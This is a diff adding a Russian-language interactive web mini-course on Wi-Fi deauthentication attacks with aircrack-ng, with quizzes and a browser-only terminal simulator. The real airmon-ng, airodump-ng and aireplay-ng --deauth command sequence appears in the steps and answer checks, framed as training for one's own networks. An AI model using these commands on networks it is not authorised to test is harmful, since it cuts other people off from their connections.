@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Мини-курс: Сбой Wi-Fi с aireplay-ng</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #181c20;
+      --bg2: #23272b;
+      --text: #e0e0e0;
+      --accent: #7a8ca5;
+      --accent2: #b0c4de;
+      --danger: #e57373;
+      --success: #81c784;
+      --radius: 14px;
+      --shadow: 0 2px 16px 0 #000a  ;
+    }
+    html, body {
+      margin: 0; padding: 0; min-height: 100vh;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 16px;
+      box-sizing: border-box;
+      overflow-x: hidden;
+      max-width: 100vw;
+    }
+    body {
+      display: flex; flex-direction: column; min-height: 100vh;
+    }
+    header {
+      background: var(--bg2);
+      padding: 1.2rem 1rem 1rem 1rem;
+      text-align: center;
+      box-shadow: var(--shadow);
+    }
+    header h1 {
+      margin: 0;
+      font-size: 1.5rem;
+      color: var(--accent2);
+      letter-spacing: 1px;
+    }
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 1rem 0.5rem 2.5rem 0.5rem;
+      max-width: 100vw;
+      margin: 0 auto;
+      width: 100%;
+      box-sizing: border-box;
+      min-width: 0;
+    }
+    .card {
+      background: var(--bg2);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 1.2rem 1rem;
+      margin-bottom: 1.2rem;
+      width: 100%;
+      max-width: 100vw;
+      transition: box-shadow 0.2s;
+      box-sizing: border-box;
+      min-width: 0;
+    }
+    .card.active {
+      border: 2px solid var(--accent);
+      box-shadow: 0 0 0 2px var(--accent2), var(--shadow);
+    }
+    .step-title {
+      color: var(--accent2);
+      font-size: 1.1rem;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+      max-width: 100vw;
+      min-width: 0;
+      box-sizing: border-box;
+    }
+    .terminal {
+      background: #111417;
+      color: #b0c4de;
+      border-radius: 8px;
+      padding: 0.7rem 0.8rem;
+      font-size: 0.98em;
+      margin: 0.7rem 0 0.7rem 0;
+      font-family: 'JetBrains Mono', monospace;
+      box-shadow: 0 1px 6px #0006;
+      position: relative;
+      overflow-x: auto;
+      max-width: 100vw;
+      min-width: 0;
+      box-sizing: border-box;
+    }
+    .terminal .prompt {
+      color: var(--accent);
+    }
+    .terminal .output {
+      color: var(--success);
+      display: block;
+      margin-top: 0.2em;
+    }
+    .test {
+      margin: 1rem 0 0.5rem 0;
+      background: #23272b;
+      border-radius: 8px;
+      padding: 0.7rem 0.8rem;
+      box-shadow: 0 1px 6px #0006;
+      max-width: 100vw;
+      min-width: 0;
+      box-sizing: border-box;
+    }
+    .test label {
+      display: block;
+      margin-bottom: 0.5em;
+      color: var(--accent2);
+      font-size: 0.98em;
+    }
+    .test input[type="text"] {
+      width: 100%;
+      padding: 0.5em;
+      border-radius: 6px;
+      border: 1px solid var(--accent);
+      background: #181c20;
+      color: var(--text);
+      font-family: inherit;
+      font-size: 1em;
+      margin-bottom: 0.7em;
+    }
+    .test button {
+      background: var(--accent);
+      color: var(--bg);
+      border: none;
+      border-radius: 6px;
+      padding: 0.5em 1.2em;
+      font-size: 1em;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 0.2em;
+    }
+    .test button:active {
+      background: var(--accent2);
+    }
+    .test .result {
+      margin-top: 0.5em;
+      font-size: 0.98em;
+    }
+    .simulator {
+      background: #111417;
+      border-radius: 8px;
+      padding: 1rem 1rem 0.5rem 1rem;
+      margin: 1rem 0 0.5rem 0;
+      box-shadow: 0 1px 6px #0006;
+      color: var(--accent2);
+      font-size: 1em;
+      min-height: 120px;
+      font-family: 'JetBrains Mono', monospace;
+      position: relative;
+      max-width: 100vw;
+      min-width: 0;
+      box-sizing: border-box;
+    }
+    .simulator .sim-input {
+      width: 100%;
+      background: #181c20;
+      color: var(--text);
+      border: 1px solid var(--accent);
+      border-radius: 6px;
+      padding: 0.5em;
+      font-size: 1em;
+      margin-top: 0.7em;
+      font-family: inherit;
+    }
+    .simulator .sim-btn {
+      background: var(--accent);
+      color: var(--bg);
+      border: none;
+      border-radius: 6px;
+      padding: 0.5em 1.2em;
+      font-size: 1em;
+      font-family: inherit;
+      cursor: pointer;
+      margin-top: 0.7em;
+      margin-bottom: 0.5em;
+      transition: background 0.2s;
+    }
+    .simulator .sim-btn:active {
+      background: var(--accent2);
+    }
+    .simulator .sim-output {
+      margin-top: 0.7em;
+      color: var(--success);
+      font-size: 0.98em;
+      min-height: 1.2em;
+    }
+    .progress {
+      width: 100%;
+      height: 6px;
+      background: #23272b;
+      border-radius: 3px;
+      margin: 1.2rem 0 1.5rem 0;
+      overflow: hidden;
+      max-width: 100vw;
+      min-width: 0;
+      box-sizing: border-box;
+    }
+    .progress-bar {
+      height: 100%;
+      background: var(--accent);
+      width: 0%;
+      transition: width 0.4s;
+    }
+    .next-btn {
+      background: var(--accent);
+      color: var(--bg);
+      border: none;
+      border-radius: 6px;
+      padding: 0.7em 1.5em;
+      font-size: 1.1em;
+      font-family: inherit;
+      cursor: pointer;
+      margin: 1.2em auto 0 auto;
+      display: block;
+      transition: background 0.2s;
+      box-shadow: 0 1px 6px #0006;
+    }
+    .next-btn:active {
+      background: var(--accent2);
+    }
+    @media (max-width: 600px) {
+      main { padding: 0.5rem 0.1rem 2.5rem 0.1rem; }
+      .card { padding: 0.7rem 0.3rem; }
+      .simulator { padding: 0.7rem 0.5rem 0.5rem 0.5rem; }
+      .step-title { padding: 0.2rem 0.1rem; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Мини-курс: Сбой Wi-Fi с помощью aireplay-ng</h1>
+    <div style="color:var(--accent);font-size:0.98em;margin-top:0.3em;">Тёмная тема • Мобильная адаптация • Стальной акцент</div>
+  </header>
+  <main>
+    <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
+    <div id="steps"></div>
+    <button class="next-btn" id="next-btn" style="display:none;">Далее</button>
+  </main>
+  <script>
+    // Этапы курса
+    const steps = [
+      {
+        title: 'Введение',
+        content: `<p><b>Deauth-атака</b> — это способ временно отключить устройства от Wi-Fi сети, отправляя специальные пакеты (deauthentication) на точку доступа. Это используется для тестирования безопасности, но <b>запрещено применять на чужих сетях</b>!<br><br>
+        <b>aireplay-ng</b> — часть пакета aircrack-ng, позволяет отправлять такие пакеты. В этом курсе вы узнаете, как это работает, и попробуете симуляцию на мини-компьютере.<br><br>
+        <span style='color:var(--danger)'>Всё, что вы увидите — только для обучения и тестирования своих сетей!</span></p>`
+      },
+      {
+        title: 'Как работает deauth-атака?',
+        content: `<p>Wi-Fi работает по стандарту IEEE 802.11. Любое устройство может отправить deauth-пакет, чтобы отключить клиента от точки доступа.<br>
+        <b>aireplay-ng</b> позволяет отправлять такие пакеты массово, вызывая сбой соединения у всех клиентов.<br><br>
+        <b>Пример сценария:</b><br>
+        1. Перевести адаптер в режим мониторинга<br>
+        2. Найти нужную сеть (BSSID)<br>
+        3. Отправить deauth-пакеты<br>
+        4. Клиенты теряют соединение и пытаются переподключиться</p>`
+      },
+      {
+        title: 'Шаг 1: Подготовка',
+        content: `<p>Для начала убедитесь, что у вас есть Wi-Fi адаптер с поддержкой режима мониторинга и установлен пакет <b>aircrack-ng</b>.<br>В реальной жизни для тестирования используйте только свои сети!</p>
+        <div class="terminal"><span class="prompt">$</span> sudo apt update && sudo apt install aircrack-ng</div>`
+      },
+      {
+        title: 'Шаг 2: Перевод адаптера в режим мониторинга',
+        content: `<p>Переведите Wi-Fi адаптер в режим мониторинга (пример для интерфейса <b>wlan0</b>):</p>
+        <div class="terminal"><span class="prompt">$</span> sudo airmon-ng start wlan0</div>`
+      },
+      {
+        title: 'Шаг 3: Поиск сетей',
+        content: `<p>Сканируем эфир для поиска доступных Wi-Fi сетей:</p>
+        <div class="terminal"><span class="prompt">$</span> sudo airodump-ng wlan0mon</div>`
+      },
+      {
+        title: 'Шаг 4: Деаутентификация клиентов',
+        content: `<p>Для сбоя работы сети отправим deauth-пакеты:<br>Замените <b>[BSSID]</b> на MAC-адрес точки доступа, <b>[iface]</b> — на ваш интерфейс (например, wlan0mon):</p>
+        <div class="terminal"><span class="prompt">$</span> sudo aireplay-ng --deauth 10 -a [BSSID] [iface]</div>`
+      },
+      {
+        title: 'Тест: Команда для режима мониторинга',
+        content: `<div class="test">
+          <label>Введите команду для перевода адаптера wlan0 в режим мониторинга:</label>
+          <input type="text" id="test1" autocomplete="off" placeholder="...">
+          <button onclick="checkTest1()">Проверить</button>
+          <div class="result" id="result1"></div>
+        </div>`
+      },
+      {
+        title: 'Тест: Команда деаутентификации',
+        content: `<div class="test">
+          <label>Введите команду для отправки 10 deauth-пакетов (BSSID: 11:22:33:44:55:66, iface: wlan0mon):</label>
+          <input type="text" id="test2" autocomplete="off" placeholder="...">
+          <button onclick="checkTest2()">Проверить</button>
+          <div class="result" id="result2"></div>
+        </div>`
+      },
+      {
+        title: 'Симулятор атаки',
+        content: `<div class="mini-pc">
+          <div class="pc-body">
+            <div class="pc-screen" id="pc-screen">
+              <div class="pc-terminal" id="pc-terminal">
+                <span class="pc-prompt">user@pentest:~$</span> <span id="pc-cmd"></span><span class="pc-cursor" id="pc-cursor">█</span>
+              </div>
+            </div>
+            <div class="pc-leds">
+              <span class="led led-green" id="led-power"></span>
+              <span class="led led-yellow" id="led-net"></span>
+              <span class="led led-red" id="led-attack"></span>
+            </div>
+            <div class="pc-keyboard">
+              <input class="pc-input" id="pc-input" autocomplete="off" placeholder="Введите команду и Enter">
+            </div>
+          </div>
+        </div>
+        <div class="sim-output" id="sim-output"></div>
+        <div class="sim-progress" id="sim-progress" style="display:none;"><div class="sim-progress-bar" id="sim-progress-bar"></div></div>
+        <div style="text-align:center;margin-top:1em;color:var(--accent2);font-size:0.98em;">Попробуйте пройти все этапы атаки на мини-компьютере!</div>`
+      },
+      {
+        title: 'Поздравляем!',
+        content: `<p>Вы прошли мини-курс и попробовали симуляцию сбоя Wi-Fi с помощью aireplay-ng.<br>Используйте эти знания только в легальных целях и для тестирования своих сетей!</p>`
+      }
+    ];
+
+    let currentStep = 0;
+    const stepsDiv = document.getElementById('steps');
+    const nextBtn = document.getElementById('next-btn');
+    const progressBar = document.getElementById('progress-bar');
+
+    function renderStep() {
+      stepsDiv.innerHTML = '';
+      const step = steps[currentStep];
+      const card = document.createElement('div');
+      card.className = 'card active';
+      card.innerHTML = `<div class="step-title">${step.title}</div>${step.content}`;
+      stepsDiv.appendChild(card);
+      // Кнопка далее
+      if (currentStep < steps.length - 1) {
+        nextBtn.style.display = 'block';
+        nextBtn.disabled = (step.title.startsWith('Тест') || step.title.startsWith('Симулятор'));
+      } else {
+        nextBtn.style.display = 'none';
+      }
+      // Прогресс
+      progressBar.style.width = ((currentStep) / (steps.length - 1) * 100) + '%';
+      // Вызов setupMiniPC при рендере этапа симулятора
+      if (step.title === 'Симулятор атаки') {
+        setTimeout(setupMiniPC, 100);
+      }
+    }
+
+    nextBtn.onclick = function() {
+      if (currentStep < steps.length - 1) {
+        currentStep++;
+        renderStep();
+      }
+    };
+
+    // Тест 1: команда для режима мониторинга
+    window.checkTest1 = function() {
+      const val = document.getElementById('test1').value.trim();
+      const res = document.getElementById('result1');
+      if (/^sudo\s+airmon-ng\s+start\s+wlan0$/i.test(val)) {
+        res.innerHTML = '<span style="color:var(--success)">Верно!</span>';
+        nextBtn.disabled = false;
+      } else {
+        res.innerHTML = '<span style="color:var(--danger)">Неверно. Попробуйте ещё раз.</span>';
+      }
+    };
+    // Тест 2: команда деаутентификации
+    window.checkTest2 = function() {
+      const val = document.getElementById('test2').value.trim();
+      const res = document.getElementById('result2');
+      if (/^sudo\s+aireplay-ng\s+--deauth\s+10\s+-a\s+11:22:33:44:55:66\s+wlan0mon$/i.test(val)) {
+        res.innerHTML = '<span style="color:var(--success)">Верно!</span>';
+        nextBtn.disabled = false;
+      } else {
+        res.innerHTML = '<span style="color:var(--danger)">Неверно. Попробуйте ещё раз.</span>';
+      }
+    };
+    // Симулятор атаки
+    window.runSim = function() {
+      const val = document.getElementById('sim-cmd').value.trim();
+      const out = document.getElementById('sim-output');
+      if (/^sudo\s+aireplay-ng\s+--deauth\s+10\s+-a\s+11:22:33:44:55:66\s+wlan0mon$/i.test(val)) {
+        out.innerHTML = 'Отправка deauth-пакетов...<br>Клиенты отключены! <span style="color:var(--success)">[Успех]</span>';
+        nextBtn.disabled = false;
+      } else if (val) {
+        out.innerHTML = '<span style="color:var(--danger)">Ошибка: неправильная команда.</span>';
+      } else {
+        out.innerHTML = '';
+      }
+    };
+
+    // Добавить стили для мини-компьютера и анимаций
+    const style = document.createElement('style');
+    style.innerHTML = `
+    .mini-pc { display: flex; justify-content: center; margin: 1.2em 0; width: 100%; max-width: 100vw; overflow-x: hidden; box-sizing: border-box; min-width: 0; }
+    .pc-body { background: #23272b; border-radius: 18px 18px 24px 24px; box-shadow: 0 4px 32px #000a, 0 8px 0 #181c20 inset; padding: 1.2em 1em 1em 1em; width: 98vw; max-width: 400px; min-width: 0; position: relative; border: 3px solid #7a8ca5; margin: 0 auto; overflow: hidden; box-sizing: border-box; }
+    .pc-feet { position: absolute; left: 18px; right: 18px; bottom: -16px; display: flex; justify-content: space-between; }
+    .pc-foot { width: 32px; height: 12px; background: #444d57; border-radius: 6px 6px 12px 12px; box-shadow: 0 2px 8px #0008; }
+    .pc-screen { background: linear-gradient(120deg, #101216 85%, #23272b 100%); border-radius: 16px; box-shadow: 0 2px 12px #0008, 0 0 0 3px #7a8ca5 inset; width: 100%; min-height: 100px; height: 32vw; max-height: 180px; margin-bottom: 1em; display: flex; align-items: flex-end; overflow: hidden; position: relative; min-width: 0; max-width: 100%; box-sizing: border-box; }
+    .pc-screen::after { content: ''; position: absolute; left: 12px; top: 12px; width: 65%; height: 22px; background: linear-gradient(90deg, #fff2 10%, #fff1 60%, transparent 100%); border-radius: 10px; opacity: 0.16; pointer-events: none; }
+    .pc-terminal { color: #b0c4de; font-family: 'JetBrains Mono', monospace; font-size: 1.13em; padding: 0.9em; width: 100%; min-height: 2em; filter: contrast(1.1) brightness(1.1); text-shadow: 0 0 2px #7a8ca5, 0 0 1px #fff1; animation: term-flicker 2.5s infinite linear alternate; word-break: break-all; }
+    @keyframes term-flicker { 0%{opacity:1;} 97%{opacity:1;} 98%{opacity:0.97;} 99%{opacity:1;} 100%{opacity:0.99;} }
+    .pc-leds { display: flex; gap: 0.7em; margin-bottom: 1em; justify-content: center; }
+    .led { display: inline-block; width: 18px; height: 18px; border-radius: 50%; background: #444; box-shadow: 0 0 8px #0008; border: 2px solid #222; opacity: 0.4; filter: brightness(0.7); transition: opacity 0.4s, filter 0.4s, box-shadow 0.4s; }
+    .led.on { opacity: 1; filter: brightness(1.2); }
+    .led-green { background: #4caf50; box-shadow: 0 0 12px #4caf50; }
+    .led-yellow { background: #ffeb3b; box-shadow: 0 0 12px #ffeb3b; }
+    .led-red { background: #e57373; box-shadow: 0 0 12px #e57373; }
+    .pc-keyboard { margin-top: 0.7em; }
+    .pc-input { width: 100%; background: #181c20; color: var(--text); border: 1.5px solid #7a8ca5; border-radius: 8px; padding: 0.9em 0.7em; font-size: 1.13em; font-family: inherit; margin-bottom: 0.7em; box-sizing: border-box; }
+    .sim-progress { width: 100%; background: #23272b; border-radius: 6px; margin: 1em 0 0.5em 0; height: 14px; overflow: hidden; }
+    .sim-progress-bar { height: 100%; background: var(--accent); width: 0%; transition: width 0.5s; }
+    @media (max-width: 600px) {
+      .pc-body { max-width: 98vw; width: 98vw; padding: 0.2em 0.01em 0.2em 0.01em; }
+      .mini-pc { max-width: 100vw; padding: 0; }
+      .pc-terminal, .pc-input { font-size: 16px; }
+      .pc-screen { height: 32vw; min-height: 100px; max-height: 140px; }
+      .card { padding: 0.7rem 0.3rem; }
+      .step-title { padding: 0.2rem 0.1rem; }
+    }
+    @media (max-width: 400px) { .pc-body { max-width: 100vw; } }
+    `;
+    document.head.appendChild(style);
+
+    // Симулятор мини-компьютера
+    function setupMiniPC() {
+      const pcInput = document.getElementById('pc-input');
+      const pcTerminal = document.getElementById('pc-terminal');
+      const pcCmd = document.getElementById('pc-cmd');
+      const pcCursor = document.getElementById('pc-cursor');
+      const ledPower = document.getElementById('led-power');
+      const ledNet = document.getElementById('led-net');
+      const ledAttack = document.getElementById('led-attack');
+      const simOutput = document.getElementById('sim-output');
+      const simProgress = document.getElementById('sim-progress');
+      const simProgressBar = document.getElementById('sim-progress-bar');
+      // Проверка наличия всех нужных элементов
+      if (!pcInput || !pcTerminal || !pcCmd || !pcCursor || !ledPower || !ledNet || !ledAttack || !simOutput || !simProgress || !simProgressBar) {
+        setTimeout(setupMiniPC, 100);
+        return;
+      }
+      // Добавить ножки и кнопку перезагрузки
+      const pcBody = document.querySelector('.pc-body');
+      if (!document.querySelector('.pc-feet')) {
+        const feet = document.createElement('div');
+        feet.className = 'pc-feet';
+        feet.innerHTML = '<div class="pc-foot"></div><div class="pc-foot"></div>';
+        pcBody.appendChild(feet);
+      }
+      if (!document.querySelector('.pc-reload')) {
+        const reloadBtn = document.createElement('button');
+        reloadBtn.className = 'pc-reload';
+        reloadBtn.textContent = 'Перезагрузить мини-компьютер';
+        reloadBtn.onclick = resetSim;
+        pcBody.appendChild(reloadBtn);
+      }
+      // Анимация загрузки
+      function bootAnim() {
+        pcTerminal.innerHTML = '';
+        let lines = [
+          'Booting mini-pc...','[OK] Power','[OK] BIOS','[OK] Loading OS','[OK] Network','user@pentest:~$'
+        ];
+        let i=0;
+        setLED(ledPower, 1); setLED(ledNet, 0); setLED(ledAttack, 0);
+        function nextLine() {
+          if (i<lines.length) {
+            const span = document.createElement('span');
+            span.textContent = lines[i]+'\n';
+            span.style.color = i<2?'#81c784':(i<4?'#b0c4de':'#7a8ca5');
+            pcTerminal.appendChild(span);
+            pcTerminal.scrollTop = pcTerminal.scrollHeight;
+            i++;
+            setTimeout(nextLine, 350);
+          } else {
+            pcTerminal.innerHTML += '<span class="pc-prompt">user@pentest:~$</span> <span id="pc-cmd"></span><span class="pc-cursor" id="pc-cursor">█</span>';
+            setLED(ledNet, 0.7);
+            setLED(ledAttack, 0);
+            pcInput.disabled = false;
+            pcInput.focus();
+          }
+        }
+        pcInput.disabled = true;
+        nextLine();
+      }
+      function setLED(led, on) {
+        if (on) led.classList.add('on'); else led.classList.remove('on');
+      }
+      function printTerminal(text, color) {
+        const span = document.createElement('span');
+        span.textContent = text + '\n';
+        if (color) span.style.color = color;
+        pcTerminal.appendChild(span);
+        pcTerminal.scrollTop = pcTerminal.scrollHeight;
+      }
+      function resetSim() {
+        pcTerminal.innerHTML = '';
+        simOutput.textContent = '';
+        simProgress.style.display = 'none';
+        simProgressBar.style.width = '0%';
+        setLED(ledPower, 1); setLED(ledNet, 0); setLED(ledAttack, 0);
+        stage = 0; history = [];
+        bootAnim();
+      }
+      let stage = 0;
+      let history = [];
+      let busy = false;
+      resetSim();
+      pcInput.value = '';
+      pcInput.focus();
+      pcInput.onkeydown = function(e) {
+        if (busy) return;
+        if (e.key === 'Enter') {
+          const cmd = pcInput.value.trim();
+          if (!cmd) return;
+          history.push(cmd);
+          pcTerminal.innerHTML += '\n<span class="pc-prompt">user@pentest:~$</span> ' + cmd;
+          pcInput.value = '';
+          pcCmd.textContent = '';
+          // Сценарии этапов
+          if (stage === 0 && /^sudo\s+airmon-ng\s+start\s+wlan0$/i.test(cmd)) {
+            setLED(ledNet, 1);
+            printTerminal('Переводим wlan0 в режим мониторинга... [OK]', '#81c784');
+            stage = 1;
+          } else if (stage === 1 && /^sudo\s+airodump-ng\s+wlan0mon$/i.test(cmd)) {
+            printTerminal('Сканирование сетей...\nBSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n11:22:33:44:55:66  -40      100        0    0   6  54e  WPA2 CCMP   PSK  testwifi', '#b0c4de');
+            stage = 2;
+          } else if (stage === 2 && /^sudo\s+aireplay-ng\s+--deauth\s+10\s+-a\s+11:22:33:44:55:66\s+wlan0mon$/i.test(cmd)) {
+            setLED(ledAttack, 1);
+            simProgress.style.display = 'block';
+            simProgressBar.style.width = '0%';
+            busy = true;
+            let prog = 0;
+            printTerminal('Отправка deauth-пакетов...', '#e57373');
+            const interval = setInterval(() => {
+              prog += 20;
+              simProgressBar.style.width = prog + '%';
+              if (prog >= 100) {
+                clearInterval(interval);
+                printTerminal('Клиенты отключены! [Успех]', '#81c784');
+                simOutput.innerHTML = '<span style="color:var(--success)">Атака завершена успешно!</span>';
+                setLED(ledAttack, 0);
+                busy = false;
+                nextBtn.disabled = false;
+              }
+            }, 500);
+            stage = 3;
+          } else {
+            printTerminal('bash: команда не найдена или не на этом этапе', '#e57373');
+          }
+        } else {
+          setTimeout(() => {
+            pcCmd.textContent = pcInput.value;
+          }, 0);
+        }
+      };
+      // Не перекрывать экран клавиатурой на мобильных
+      pcInput.scrollIntoView({block:'center'});
+    }
+
+    // Инициализация
+    renderStep();
+  </script>
+</body>
+</html>
